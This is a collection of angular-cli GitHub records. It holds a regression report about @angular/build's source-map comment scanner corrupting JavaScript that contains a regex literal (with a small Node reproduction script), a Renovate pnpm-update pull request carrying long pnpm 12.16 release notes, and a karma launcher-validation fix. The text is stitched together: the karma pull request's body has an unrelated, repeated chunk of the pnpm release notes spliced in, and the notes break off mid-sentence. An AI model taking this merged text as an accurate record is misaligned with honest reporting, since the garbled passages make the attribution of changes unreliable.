Issues.Title: @angular/build: source-map comment scanner corrupts valid JS containing a regex literal
Issues.Body:
### Command

serve

### Is this a regression?

- [x] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

@angular/build 22.0.9 passes the isolated source-map removal test. @angular/cli remains at 22.2.4; Angular framework packages remain at 22.2.3.

### Description

With @angular/build 22.2.4, ng serve fails when optimization and script
source maps are enabled. Vite reports invalid JavaScript during import
analysis. However, ng build succeeds, and the built application worked
when served separately using a local static server.

The failure was traced to removeSourceMappingURL in @angular/build.
The development-server memory plugin calls this function before handing
generated JavaScript to Vite when a source map is present.

The scanner appears to interpret a double quote inside a valid
regular-expression literal as the beginning of a string. It then loses
track of the actual string boundaries and removes a sourceMappingURL-like
sequence that is string content, not a JavaScript comment.

This can be reproduced directly using the published build package,
without application code, authentication libraries, or Vite itself.

Expected:
Source-map comment removal preserves valid JavaScript, including
regular-expression literals and strings containing sourceMappingURL text.

Actual:
Valid JavaScript is truncated into invalid JavaScript. Vite subsequently
reports the parsing error.

The desired behavior is to keep both optimization and script source maps
enabled.

### Minimal Reproduction

With `@angular/build@22.2.4` installed, save the following as `repro.cjs`
and run:

```sh
node repro.cjs
```

This intentionally calls the internal utility to isolate the defect.
It is a standalone scanner reproduction, not a complete Angular app.

```js
const assert = require('node:assert/strict');
const path = require('node:path');
const vm = require('node:vm');

const packageRoot = path.dirname(
  require.resolve('@angular/build/package.json')
);

const { removeSourceMappingURL } = require(
  path.join(packageRoot, 'src', 'utils', 'source-map.js')
);

const input =
  'const pattern = /"/; const text = "//# sourceMappingURL=not-a-comment";';

new vm.Script(input); // The input is valid JavaScript.

const output = removeSourceMappingURL(input);
console.log(output);

assert.equal(
  output,
  input,
  'Input without an actual source-map comment should remain unchanged'
);
```

Expected:
The assertion passes and the input is preserved unchanged.

Actual:
The assertion fails. The output is:

```js
const pattern = /"/; const text = "
```

The output is invalid JavaScript. The `sourceMappingURL` text was inside
a quoted string, not an actual comment.

### Exception or Error

```text
[vite] Internal server error: Failed to parse source for import analysis
because the content contains invalid JS syntax. If you are using JSX,
make sure to name the file with the .jsx or .tsx extension.
Plugin: vite:import-analysis

The standalone reproduction fails its equality assertion.
Parsing the truncated output also produces:
SyntaxError: Invalid or unexpected token
```

### Your Environment

```text
Original failing environment:
@angular/build: 22.2.4
@angular/cli: 22.2.4
@angular/core: 22.2.3
@angular/compiler: 22.2.3
@angular/compiler-cli: 22.2.3
TypeScript: 6.0.3
Vite: 8.3.0
Node.js: 24.20.0
OS: Windows

Current version-pin configuration:
@angular/build: 22.0.9
@angular/cli: 22.2.4 — unchanged
Angular core/compiler/compiler-cli: 22.2.3 — unchanged
Vite resolved by @angular/build: 7.3.6
```

### Anything else relevant?

### Temporary workaround applied

Pinned `@angular/build` to exactly `22.0.9` instead of `22.2.4`:

"@angular/build": "22.0.9"

This is the workaround currently used, not a fix to the scanner.

- `@angular/cli` remains at `22.2.4` — it was not downgraded.
- Angular core/compiler/compiler-cli remain at `22.2.3`.
- Optimization and script source maps remain enabled.

The pinned build package uses Vite `7.3.6` instead of `8.3.0`.
However, the minimal reproduction demonstrates the corruption directly
in `@angular/build`'s source-map scanner without invoking Vite.


### Related issue and fix

- [Issue #33544 — Source-map comment removal corrupts JavaScript inside template literals](https://github.com/angular/angular-cli/issues/33544)
- [PR #33545 — Prevent stripping nested sourceMappingURL comments](https://github.com/angular/angular-cli/pull/33545)

The earlier issue concerned source-map text inside template literals.
Its fix introduced the replacement scanner. This report concerns
regular-expression literal handling in that scanner.
Issues.RelatedDescription: Open issue "@angular/build: source-map comment scanner corrupts valid JS containing a regex literal" (#34590)

Issues.Title: build: update pnpm to v12.16.1 (22.2.x)
Issues.Body:
This PR contains the following updates: | Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Adoption](https://docs.renovatebot.com/merge-confidence/) | [Passing](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) | |---|---|---|---|---|---| | [pnpm](https://pnpm.io) ([source](https://redirect.github.com/pnpm/pnpm/tree/HEAD/pnpm/npm/pnpm)) | [`12.15.0` → `12.16.1`](https://renovatebot.com/diffs/npm/pnpm/12.15.0/12.16.1) | ![age](https://developer.mend.io/api/mc/badges/age/npm/pnpm/12.16.1?slim=true) | ![adoption](https://developer.mend.io/api/mc/badges/adoption/npm/pnpm/12.16.1?slim=true) | ![passing](https://developer.mend.io/api/mc/badges/compatibility/npm/pnpm/12.15.0/12.16.1?slim=true) | ![confidence](https://developer.mend.io/api/mc/badges/confidence/npm/pnpm/12.15.0/12.16.1?slim=true) | --- - [ ] If you want to rebase/retry this PR, check this box --- ### Release Notes
pnpm/pnpm (pnpm) ### [`v12.16.1`](https://redirect.github.com/pnpm/pnpm/releases/tag/v12.16.1): pnpm 12.16.1 [Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v12.16.0...v12.16.1) This release fixes `pnpm install` hanging on a cold store in workspaces that install Cargo crates, and `pnpm pack` shipping a file that `files` excludes by name. ##### Patch Changes - `pnpm install` no longer hangs on a cold store in a workspace that also installs Cargo crates or a Rust toolchain. - `pnpm pack` and `pnpm publish` now apply a `files` entry that names a file after the glob and directory entries, as npm does. A file excluded by name, such as `!dist/index.js`, stays out even when a later `dist/**` matches it. A file named by its path, such as `lib/secret.js`, ships even when a later `!lib/*.js` matches it. - `pnpm install` no longer leaves a broken symlink in an injected workspace dependency when the package links to a file outside its published files and pnpm imports by hardlink. Installing a git dependency now skips internal directory symlinks when importing its files into the store. - `pnpm install` now relinks a command that a workspace project renames into the projects that depend on it when `sharedWorkspaceLockfile` is `false` [pnpm/tasks#224](https://redirect.github.com/pnpm/tasks/issues/224). - `pnpm install` and `pnpm rebuild` now refresh privately hoisted `.bin` shims in `node_modules/.pnpm/node_modules/.bin` after a dependency build replaces a script target with a native executable [#​17402](https://redirect.github.com/pnpm/pnpm/issues/17402). - `pnpm install` now reads a package's manifest to decide its peer dependencies when it updates an existing lockfile, as it does when it resolves from scratch. - Commands, `pnpm --version`, `pnpm self-update`, and invocations with unknown flags now apply the same `packageManager` and `devEngines.packageManager` settings when switching to the pinned pnpm version or recording it in `pnpm-lock.yaml`. `--config.` flags and `lockfileDir` now reach the version switch and lockfile sync on every entry point. Unreadable settings in `pnpm-workspace.yaml` or the global `config.yaml` that do not affect the pin decision no longer block the version switch [pnpm/tasks#222](https://redirect.github.com/pnpm/tasks/issues/222). - pnpm now accepts the `--cache-dir ` flag, as in `pnpm install --cache-dir /tmp/pnpm-cache` [#​17422](https://redirect.github.com/pnpm/pnpm/issues/17422). - When the version or range given to `pnpm unpublish` matches every published version, the error now says so and shows the same command with `--force`. Before, the error suggested running `pnpm unpublish @`, the command that had just failed. ##### Platinum Sponsors
##### Gold Sponsors
### [`v12.16.0`](https://redirect.github.com/pnpm/pnpm/releases/tag/v12.16.0): pnpm 12.16 [Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v12.15.0...v12.16.0) This release adds a global `--env-file` flag, updates to a symlinked `pnpm-lock.yaml`, and `pnpm setup --no-modify-path`. It also fixes two security issues, in zstd decompression and in signing. ##### Minor Changes - Added a repeatable global `--env-file ` flag to load environment variables from dotenv-style files before running a command. Later files override earlier files, variables already in the environment are preserved, and loaded variables are visible to user-level `.npmrc` interpolation and lifecycle scripts [#​7111](https://redirect.github.com/pnpm/pnpm/issues/7111). - pnpm can now update a `pnpm-lock.yaml` that is a symlink. List the directories the lockfile may link into in the `symlinkedLockfileTargetDirs` setting, in the global config or with `PNPM_CONFIG_SYMLINKED_LOCKFILE_TARGET_DIRS`. pnpm writes the update to the file the symlink points to if that file is inside one of these directories. The symlink stays in place. pnpm ignores this setting in `pnpm-workspace.yaml` [#​17222](https://redirect.github.com/pnpm/pnpm/issues/17222). - Added a `--no-modify-path` option to `pnpm setup`. It installs pnpm without adding it to `PATH`, leaving the shell config file, the Windows registry, and the GitHub Actions environment files unchanged. `pnpm setup` then prints the lines to add yourself [get.pnpm.io#37](https://redirect.github.com/pnpm/get.pnpm.io/issues/37). ##### Patch Changes ##### Security - Fixed memory exposure and allocation handling vulnerabilities when processing zstd-compressed data [#​17388](https://redirect.github.com/pnpm/pnpm/pull/17388). - Signing in pnpm and pnpr no longer uses arithmetic that may leak the private key through timing. This covers shared artifacts, OCI registry tokens, and OIDC login state [advisory](https://rustsec.org/advisories/RUSTSEC-2026-0387). ##### Installing packages - A dependency symlink that pnpm cannot point at the wanted target now fails the install with an error that names the link. This happens when the filesystem still serves the old link after pnpm removed it, as a `node_modules` served by a virtual filesystem does. pnpm used to remove the link again without end and crashed with a segmentation fault once the thread ran out of stack. - Concurrent workspace installs no longer lose store-index rows when initializing the shared SQLite index [#​17388](https://redirect.github.com/pnpm/pnpm/pull/17388). - Agent skill links now keep the same target across installs when a package version is installed with several sets of peer dependencies. An install no longer fails with `ERR_PNPM_AGENT_SKILL_PATH_OCCUPIED` on a skill link that pnpm created for another of those copies [#​17319](https://redirect.github.com/pnpm/pnpm/issues/17319). - pnpm now fails at once, without retrying, when a downloaded package archive contains a rejected entry path [#​17205](https://redirect.github.com/pnpm/pnpm/issues/17205). - pnpm now builds a git-hosted dependency in every new location it links the dependency into, such as a new global virtual store slot or a fresh `node_modules`. When the side-effects cache holds the build output, pnpm restores it from there. Before, only the install that fetched the dependency built it. This also fixes dependencies that are already in the store [#​17224](https://redirect.github.com/pnpm/pnpm/issues/17224). - Changes a `preResolution` hook makes to the lockfiles now take effect. The hook now also runs when pnpm installs from an up-to-date lockfile. An error thrown by the hook now fails the install. - A custom fetcher in the pnpmfile can now call `fetchers.directory` to fetch a package from a local directory. The call rejects with `ERR_PNPM_TARBALL_INTEGRITY` if the lockfile pins an archive integrity for the package. Previously, calling `fetchers.directory` failed with a `TypeError`. - `packageImportMethod: copy` now also applies to packages that have lifecycle scripts or patches. On a filesystem that supports block cloning, such as ReFS or a Dev Drive on Windows, these packages were cloned [#​17195](https://redirect.github.com/pnpm/pnpm/issues/17195). - With `nodeLinker: hoisted` and `autoInstallPeers: false`, a package that workspace projects use with different peer versions is now installed once per peer variant, so each project's copy resolves that project's peer [#​17395](https://redirect.github.com/pnpm/pnpm/issues/17395). - Under `nodeLinker: hoisted`, `pnpm install` now leaves a patched package that is already in place alone. The same holds for a package whose peers include a patched package, such as every package peering on a patched `react-native` [#​17188](https://redirect.github.com/pnpm/pnpm/issues/17188). - With `nodeLinker: hoisted`, an install that stops partway no longer leaves the next install trusting the packages it was replacing. Before, reverting the change that started the stopped install, such as a patch edit, kept the half-replaced package in `node_modules`. ##### Repeat installs and changed settings - A repeat `pnpm install` now acts on a change to these settings. Before, it reported "Already up to date". - `storeDir` or `virtualStoreDir`: it recreates `node_modules`. - `globalVirtualStoreDir`: it links the packages from the new directory. - `virtualStoreDirMaxLength`: it renames the virtual store directories. - `dangerouslyAllowAllBuilds` turned on: it runs the builds it skipped. - `trustLockfile` turned off: it verifies the lockfile. - `pnpm add`, `pnpm remove`, and `pnpm update` now fail if `node_modules` does not match the current settings. Run `pnpm install` to recreate it. Previously, these commands removed and reinstalled `node_modules` without asking. They report: - `ERR_PNPM_UNEXPECTED_STORE` if `node_modules` was linked from a different store. - `ERR_PNPM_UNEXPECTED_VIRTUAL_STORE` if it was linked from a different virtual store directory. - `ERR_PNPM_MODULES_BREAKING_CHANGE` if it was installed by an incompatible pnpm version, or if `node_modules/.modules.yaml` cannot be read. - `ERR_PNPM_NODE_LINKER_DIFF` if it was installed with a different `nodeLinker`. `pnpm update` now also fails with `ERR_PNPM_HOIST_PATTERN_DIFF` and the other errors `pnpm add` reports for a changed hoist pattern or `virtualStoreDirMaxLength`. - An install filtered to some workspace projects now fails if `node_modules` was installed with a different `nodeLinker`, `hoistPattern`, `publicHoistPattern`, store, or virtual store. Before, it recreated `node_modules` and left the projects it skipped without their dependencies. A `pnpm install` of the whole workspace still recreates `node_modules` [pnpm/tasks#217](https://redirect.github.com/pnpm/tasks/issues/217). - `pnpm install` and the `verifyDepsBeforeRun` check now notice an edited patch file when `sharedWorkspaceLockfile` is `false`. - `pnpm install` now takes its fast path in a workspace with `patchedDependencies` when the previous install ran with another major version of pnpm. - `pnpm install` now relinks the bins of a workspace package when its `bin` field changes, including with `--frozen-lockfile` and an unchanged lockfile. A filtered install relinks them in the selected projects, and the next install that covers the remaining projects relinks them there [#​17324](https://redirect.github.com/pnpm/pnpm/issues/17324). - `pnpm install` now removes command shims from `node_modules/.bin` when a workspace dependency renames or removes an entry from its `bin` field [pnpm/tasks#211](https://redirect.github.com/pnpm/tasks/issues/211). ##### Resolving dependencies and the lockfile - A package that a plain range and a `:` specifier both resolve from one registry is now recorded once in `pnpm-lock.yaml` and installed once. The lockfile key names the registry a package resolved from. When that registry declares a prefix, through `prefix` in `registries` or through `namedRegistries`, the package is keyed `@:` however its dependency was written: with the prefix, as a plain range its scope routes to that registry, or through the default registry. Before, the plain range was keyed `@`, so one tarball was installed twice and `instanceof` checks and module singletons broke between the two copies. The same name and version served by two registries still get separate entries. When several prefixes declare one registry, its packages are keyed by the lexicographically smallest prefix. If a scope you route reaches a registry that also declares a prefix, your next `pnpm install` re-keys those entries, which shows up as a lockfile diff. Commit it. `pnpm install --frozen-lockfile` installs the lockfile as recorded. - `pnpm install` now resolves a scope's packages again when the scope is routed to another registry in `registries`. Before, the lockfile kept the versions and integrity resolved from the old registry, so the install failed when the new registry did not serve a locked version or served different content. pnpm records in the workspace state which registry each scope routed to, so a fresh clone without that record installs the lockfile as recorded. Changing the default registry resolves nothing again, and `pnpm install --frozen-lockfile` is unchanged. - When `autoDedupe` is off, a workspace project's dependencies now resolve from its own ranges, like they do with `sharedWorkspaceLockfile: false`. Previously, another project's narrower range could hold them back. For example, `ajv: "*"` now resolves to the latest Ajv even if another project depends on `ajv@^6`. Packages that a project lists in `peerDependencies` still follow the versions other projects use. `pnpm dedupe` and installs with `autoDedupe: true` still pick one version that satisfies every range. Set `autoDedupe: true` if CI runs `pnpm dedupe --check` [#​17235](https://redirect.github.com/pnpm/pnpm/issues/17235). - An optional dependency written with a named-registry prefix, such as `work:^1.0.0`, now fails the install when it cannot be resolved but the lockfile already has a matching entry from that registry. Such a dependency was skipped, which removed its entries from the lockfile. - With `injectWorkspacePackages: true`, a `workspace:` dependency written as a relative path, such as `workspace:../lib-a`, in a workspace package now resolves from that package's directory [#​17284](https://redirect.github.com/pnpm/pnpm/issues/17284). - Fixed `pnpm install` failing with `ERR_PNPM_UNSUPPORTED_PROTOCOL` when a workspace package injected through a relative path, such as `workspace:../lib`, has `catalog:` dependencies. Their catalog entries now resolve the way they do for a package injected by name [#​17280](https://redirect.github.com/pnpm/pnpm/issues/17280). - `pnpm dedupe` now refreshes cached registry metadata while re-resolving locked versions [#​17208](https://redirect.github.com/pnpm/pnpm/issues/17208). - `pnpm dedupe --check` no longer fails when the only difference is a `deprecated` notice that the registry added or removed after the lockfile was written [#​17198](https://redirect.github.com/pnpm/pnpm/issues/17198). - Installs delegated to a pnpr server now resolve every prefix declared for a registry URL. A dependency or lockfile entry that used the second of two prefixes for the same registry, such as `zeta:` next to `work:` in `namedRegistries`, failed on the server [pnpm/tasks#204](https://redirect.github.com/pnpm/tasks/issues/204). - Registry revisions are now addressed at `/@+r` [pnpm/tasks#208](https://redirect.github.com/pnpm/tasks/issues/208). ##### Adding packages and global packages - `pnpm add @` and `pnpm add @` now install the version the tag or range resolves to, even when the saved range allows a newer one [#​17234](https://redirect.github.com/pnpm/pnpm/issues/17234). - `pnpm add ` without a version now installs the version under the dist-tag set by the `tag` setting. An `npm:` alias or a `jsr:` dependency without a version resolves that tag too. The setting is read from `pnpm-workspace.yaml`, the global config, `PNPM_CONFIG_TAG`, and `--config.tag`, and defaults to `latest`. - `pnpm add` now accepts the lowercase short options `-p`, `-d`, `-o`, and `-e` as aliases of `--save-prod`, `--save-dev`, `--save-optional`, and `--save-exact`. - `pnpm -D install ` now saves the package to devDependencies. An `add` option such as `-D` or `-E` written before `install ` was rejected as an unexpected argument. - `pnpm add -T` now reports that the short option is ambiguous and points to `--save-types` and `--tilde`. - Global packages installed with `pnpm add -g` are now linked from the global virtual store, so global packages that share dependencies share one copy. Set `virtualStoreType: project` to give each global install its own virtual store. - `pnpm add -g` and the other `--global` commands now fail with `ERR_PNPM_CONFIG_CONFLICT_VIRTUAL_STORE_DIR_WITH_GLOBAL` when `--virtual-store-dir` is passed. A custom `--hoist-pattern` fails with `ERR_PNPM_CONFIG_CONFLICT_HOIST_PATTERN_WITH_GLOBAL`. Passing `--link-workspace-packages`, `--shared-workspace-lockfile`, or `--config.lockfile-dir` with `--global` also fails, with the matching `ERR_PNPM_CONFIG_CONFLICT_*_WITH_GLOBAL` code. ##### Registries, proxies, and login - pnpm now reads the `strictSsl` and `localAddress` settings from `pnpm-workspace.yaml`, the global `config.yaml`, `PNPM_CONFIG_*` environment variables, and `--config.*` options. This includes `pnpm self-update` and the download of the pnpm version pinned in `packageManager`. Before, pnpm read them only from `.npmrc` as `strict-ssl` and `local-address` and ignored the other sources [pnpm/tasks#201](https://redirect.github.com/pnpm/tasks/issues/201). - When Corepack runs pnpm and the native binary has to be downloaded, the download now uses the proxy from pnpm's config. That proxy comes from `PNPM_CONFIG_HTTPS_PROXY` and the matching variables, the global `config.yaml`, and the user `.npmrc`. Previously, the download read the proxy only from `HTTPS_PROXY`, `HTTP_PROXY`, and `NO_PROXY` [pnpm/tasks#215](https://redirect.github.com/pnpm/tasks/issues/215). - When the `pnpm` package downloads its native binary on first run, as it does under Corepack, it now trusts the CA certificates from the `ca`, `ca[]`, and `cafile` settings of `.npmrc`, including the ones scoped to the registry. A registry behind a private CA failed with `fetch failed` before, unless `NODE_EXTRA_CA_CERTS` named the CA. A project `.npmrc` is used only while the download is checked against npm's signature. Node.js versions that cannot add CA certificates after startup still need `NODE_EXTRA_CA_CERTS`. - `pnpm login` saves the token in `/auth.ini` again. Since v12.1.0, an unscoped login had made its registry the default for every project that did not name a registry. A login now also removes the token an earlier login saved for that registry or scope under `_auth` in the global `config.yaml`. `pnpm login --scope` still routes the scope through the global `registries` setting. - pnpm no longer warns that a `registries` entry routed through the `@` scope matches no configured registry. pnpm applied such an entry and its options such as `serverType` while reporting it as ignored [pnpm/tasks#184](https://redirect.github.com/pnpm/tasks/issues/184). ##### Running scripts and other commands - `pnpm ci --lockfile` and `pnpm ci --config.lockfile=true` no longer delete `pnpm-lock.yaml`. `pnpm ci` now always keeps the lockfile and runs a frozen install from it. - `pnpm deploy --legacy` now checks the workspace lockfile against `minimumReleaseAge` and the other resolution policies, as `pnpm install` does, and fails with `ERR_PNPM_MINIMUM_RELEASE_AGE_VIOLATION` when a locked version is too new. It used to deploy an older version that is not in the lockfile without a warning [#​17209](https://redirect.github.com/pnpm/pnpm/issues/17209). - `pnpm deploy` now keeps a deployed symlink to a directory inside the project even if the directory is not among the deployed files, such as a link into `node_modules` [#​17288](https://redirect.github.com/pnpm/pnpm/issues/17288). - `pnpm pack` and `pnpm publish` now keep `pnpm.config` in the published `package.json`. They also always include the file `pnpm.config` points to in the tarball [#​17210](https://redirect.github.com/pnpm/pnpm/issues/17210). - `pnpm -r publish --batch` now sends `PUT /-/pnpr/v0/publish`, the batch publish endpoint that pnpr serves. - `pnpm audit --ignore` and `pnpm audit --ignore-unfixable` now exit with a non-zero code when vulnerabilities at or above the audit level remain after ignoring. Before, these commands always exited with code 0. - `pnpm audit --fix` and `pnpm audit --interactive` now fail with `ERR_PNPM_AUDIT_FIX_WITH_IGNORE` when combined with `--ignore` or `--ignore-unfixable`. Before, the fix ran and the ignore flags had no effect. - `pnpm -r run

Issues.Title: fix(@angular/build): require only the launchers the karma configuration loads
Issues.Body:
The upfront dependency validation of the unit-test builder's karma runner derives a launcher package from each browser name. This requests packages that do not exist, such as `karma-chromium-launcher` for `ChromiumHeadless` (provided by `karma-chrome-launcher`) or a package named after a custom launcher defined in a Karma configuration file, so `ng test` fails before running.

Follow the vitest runner: skip the launcher validation when a custom configuration is used, since it loads its own plugins, and otherwise require `karma-chrome-launcher`, the only launcher of the built-in configuration. New unit specs for the karma runner's dependency validation fail without this change.

pnpm/pnpm (pnpm) ### [`v12.16.1`](https://redirect.github.com/pnpm/pnpm/releases/tag/v12.16.1): pnpm 12.16.1 [Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v12.16.0...v12.16.1) This release fixes `pnpm install` hanging on a cold store in workspaces that install Cargo crates, and `pnpm pack` shipping a file that `files` excludes by name. ##### Patch Changes - `pnpm install` no longer hangs on a cold store in a workspace that also installs Cargo crates or a Rust toolchain. - `pnpm pack` and `pnpm publish` now apply a `files` entry that names a file after the glob and directory entries, as npm does. Unreadable settings in `pnpm-workspace.yaml` or the global `config.yaml` that do not affect the pin decision no longer block the version switch [pnpm/tasks#222](https://redirect.github.com/pnpm/tasks/issues/222). - pnpm now accepts the `--cache-dir ` flag, as in `pnpm install --cache-dir /tmp/pnpm-cache` [#​17422](https://redirect.github.com/pnpm/pnpm/issues/17422). - When the version or range given to `pnpm unpublish` matches every published version, the error now says so and shows the same command with `--force`. Before, the error suggested running `pnpm unpublish @`, the command that had just failed. ##### Platinum Sponsors
##### Gold Sponsors
### [`v12.16.0`](https://redirect.github.com/pnpm/pnpm/releases/tag/v12.16.0): pnpm 12.16 [Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v12.15.0...v12.16.0) This release adds a global `--env-file` flag, updates to a symlinked `pnpm-lock.yaml`, and `pnpm setup --no-modify-path`. It also fixes two security issues, in zstd decompression and in signing. ##### Minor Changes - Added a repeatable global `--env-file ` flag to load environment variables from dotenv-style files before running a command. Later files override earlier files, variables already in the environment are preserved, and loaded variables are visible to user-level `.npmrc` interpolation and lifecycle scripts [#​7111](https://redirect.github.com/pnpm/pnpm/issues/7111). - pnpm can now update a `pnpm-lock.yaml` that is a symlink. List the directories the lockfile may link into in the `symlinkedLockfileTargetDirs` setting, in the global config or with `PNPM_CONFIG_SYMLINKED_LOCKFILE_TARGET_DIRS`. pnpm writes the update to the file the symlink points to if that file is inside one of these directories. The symlink stays in place. pnpm ignores this setting in `pnpm-workspace.yaml` [#​17222](https://redirect.github.com/pnpm/pnpm/issues/17222). - Added a `--no-modify-path` option to `pnpm setup`. It installs pnpm without adding it to `PATH`, leaving the shell config file, the Windows registry, and the GitHub Actions environment files unchanged. `pnpm setup` then prints the lines to add yourself [get.pnpm.io#37](https://redirect.github.com/pnpm/get.pnpm.io/issues/37). ##### Patch Changes ##### Security - Fixed memory exposure and allocation handling vulnerabilities when processing zstd-compressed data [#​17388](https://redirect.github.com/pnpm/pnpm/pull/17388). - Signing in pnpm and pnpr no longer uses arithmetic that may leak the private key through timing. This covers shared artifacts, OCI registry tokens, and OIDC login state [advisory](https://rustsec.org/advisories/RUSTSEC-2026-0387). ##### Installing packages - A dependency symlink that pnpm cannot point at the wanted target now fails the install with an error that names the link. This happens when the filesystem still serves the old link after pnpm removed it, as a `node_modules` served by a virtual filesystem does. pnpm used to remove the link again without end and crashed with a segmentation fault once the thread ran out of stack. - Concurrent workspace installs no longer lose store-index rows when initializing the shared SQLite index [#​17388](https://redirect.github.com/pnpm/pnpm/pull/17388). - Agent skill links now keep the same target across installs when a package version is installed with several sets of peer dependencies. An install no longer fails with `ERR_PNPM_AGENT_SKILL_PATH_OCCUPIED` on a skill link that pnpm created for another of those copies [#​17319](https://redirect.github.com/pnpm/pnpm/issues/17319). - pnpm now fails at once, without retrying, when a downloaded package archive contains a rejected entry path [#​17205](https://redirect.github.com/pnpm/pnpm/issues/17205). - pnpm now builds a git-hosted dependency in every new location it links the dependency into, such as a new global virtual store slot or a fresh `node_modules`. When the side-effects cache holds the build output, pnpm restores it from there. Before, only the install that fetched the dependency built it. This also fixes dependencies that are already in the store [#​17224](https://redirect.github.com/pnpm/pnpm/issues/17224). - Changes a `preResolution` hook makes to the lockfiles now take effect. The hook now also runs when pnpm installs from an up-to-date lockfile. An error thrown by the hook now fails the install. - A custom fetcher in the pnpmfile can now call `fetchers.directory` to fetch a package from a local directory. The call rejects with `ERR_PNPM_TARBALL_INTEGRITY` if the lockfile pins an archive integrity for the package. Previously, calling `fetchers.directory` failed with a `TypeError`. - `packageImportMethod: copy` now also applies to packages that have lifecycle scripts or patches. On a filesystem that supports block cloning, such as ReFS or a Dev Drive on Windows, these packages were cloned [#​17195](https://redirect.github.com/pnpm/pnpm/issues/17195). - With `nodeLinker: hoisted` and `autoInstallPeers: false`, a package that workspace projects use with different peer versions is now installed once per peer variant, so each project's copy resolves that project's peer [#​17395](https://redirect.github.com/pnpm/pnpm/issues/17395). - Under `nodeLinker: hoisted`, `pnpm install` now leaves a patched package that is already in place alone. The same holds for a package whose peers include a patched package, such as every package peering on a patched `react-native` [#​17188](https://redirect.github.com/pnpm/pnpm/issues/17188). - With `nodeLinker: hoisted`, an install that stops partway no longer leaves the next install trusting the packages it was replacing. Before, reverting the change that started the stopped install, such as a patch edit, kept the half-replaced package in `node_modules`. ##### Repeat installs and changed settings - A repeat `pnpm install` now acts on a change to these settings. Before, it reported "Already up to date". - `storeDir` or `virtualStoreDir`: it recreates `node_modules`. - `globalVirtualStoreDir`: it links the packages from the new directory. - `virtualStoreDirMaxLength`: it renames the virtual store directories. - `dangerouslyAllowAllBuilds` turned on: it runs the builds it skipped. - `trustLockfile` turned off: it verifies the lockfile. - `pnpm add`, `pnpm remove`, and `pnpm update` now fail if `node_modules` does not match the current settings. Run `pnpm install` to recreate it. Previously, these commands removed and reinstalled `node_modules` without asking. They report: - `ERR_PNPM_UNEXPECTED_STORE` if `node_modules` was linked from a different store. - `ERR_PNPM_UNEXPECTED_VIRTUAL_STORE` if it was linked from a different virtual store directory. - `ERR_PNPM_MODULES_BREAKING_CHANGE` if it was installed by an incompatible pnpm version, or if `node_modules/.modules.yaml` cannot be read. - `ERR_PNPM_NODE_LINKER_DIFF` if it was installed with a different `nodeLinker`. `pnpm update` now also fails with `ERR_PNPM_HOIST_PATTERN_DIFF` and the other errors `pnpm add` reports for a changed hoist pattern or `virtualStoreDirMaxLength`. - An install filtered to some workspace projects now fails if `node_modules` was installed with a different `nodeLinker`, `hoistPattern`, `publicHoistPattern`, store, or virtual store. Before, it recreated `node_modules` and left the projects it skipped without their dependencies. A `pnpm install` of the whole workspace still recreates `node_modules` [pnpm/tasks#217](https://redirect.github.com/pnpm/tasks/issues/217). - `pnpm install` and the `verifyDepsBeforeRun` check now notice an edited patch file when `sharedWorkspaceLockfile` is `false`. - `pnpm install` now takes its fast path in a workspace with `patchedDependencies` when the previous install ran with another major version of pnpm. - `pnpm install` now relinks the bins of a workspace package when its `bin` field changes, including with `--frozen-lockfile` and an unchanged lockfile. A filtered install relinks them in the selected projects, and the next install that covers the remaining projects relinks them there [#​17324](https://redirect.github.com/pnpm/pnpm/issues/17324). - `pnpm install` now removes command shims from `node_modules/.bin` when a workspace dependency renames or removes an entry from its `bin` field [pnpm/tasks#211](https://redirect.github.com/pnpm/tasks/issues/211). ##### Resolving dependencies and the lockfile - A package that a plain range and a `:` specifier both resolve from one registry is now recorded once in `pnpm-lock.yaml` and installed once. The lockfile key names the registry a package resolved from. When that registry declares a prefix, through `prefix` in `registries` or through `namedRegistries`, the package is keyed `@:` however its dependency was written: with the prefix, as a plain range its scope routes to that registry, or through the default registry. Before, the plain range was keyed `@`, so one tarball was installed twice and `instanceof` checks and module singletons broke between the two copies. The same name and version served by two registries still get separate entries. When several prefixes declare one registry, its packages are keyed by the lexicographically smallest prefix. If a scope you route reaches a registry that also declares a prefix, your next `pnpm install` re-keys those entries, which shows up as a lockfile diff. Commit it. `pnpm install --frozen-lockfile` installs the lockfile as recorded. - `pnpm install` now resolves a scope's packages again when the scope is routed to another registry in `registries`. Before, the lockfile kept the versions and integrity resolved from the old registry, so the install failed when the new registry did not serve a locked version or served different content. pnpm records in the workspace state which registry each scope routed to, so a fresh clone without that record installs the lockfile as recorded. Changing the default registry resolves nothing again, and `pnpm install --frozen-lockfile` is unchanged. - When `autoDedupe` is off, a workspace project's dependencies now resolve from its own ranges, like they do with `sharedWorkspaceLockfile: false`. Previously, another project's narrower range could hold them back. For example, `ajv: "*"` now resolves to the latest Ajv even if another project depends on `ajv@^6`. Packages that a project lists in `peerDependencies` still follow the versions other projects use. `pnpm dedupe` and installs with `autoDedupe: true` still pick one version that satisfies every range. Set `autoDedupe: true` if CI runs `pnpm dedupe --check` [#​17235](https://redirect.github.com/pnpm/pnpm/issues/17235). - An optional dependency written with a named-registry prefix, such as `work:^1.0.0`, now fails the install when it cannot be resolved but the lockfile already has a matching entry from that registry. Such a dependency was skipped, which removed its entries from the lockfile. - With `injectWorkspacePackages: true`, a `workspace:` dependency written as a relative path, such as `workspace:../lib-a`, in a workspace package now resolves from that package's directory [#​17284](https://redirect.github.com/pnpm/pnpm/issues/17284). - Fixed `pnpm install` failing with `ERR_PNPM_UNSUPPORTED_PROTOCOL` when a workspace package injected through a relative path, such as `workspace:../lib`, has `catalog:` dependencies. Their catalog entries now resolve the way they do for a package injected by name [#​17280](https://redirect.github.com/pnpm/pnpm/issues/17280). - `pnpm dedupe` now refreshes cached registry metadata while re-resolving locked versions [#​17208](https://redirect.github.com/pnpm/pnpm/issues/17208). - `pnpm dedupe --check` no longer fails when the only difference is a `deprecated` notice that the registry added or removed after the lockfile was written [#​17198](https://redirect.github.com/pnpm/pnpm/issues/17198). - Installs delegated to a pnpr server now resolve every prefix declared for a registry URL. A dependency or lockfile entry that used the second of two prefixes for the same registry, such as `zeta:` next to `work:` in `namedRegistries`, failed on the server [pnpm/tasks#204](https://redirect.github.com/pnpm/tasks/issues/204). - Registry revisions are now addressed at `/@+r` 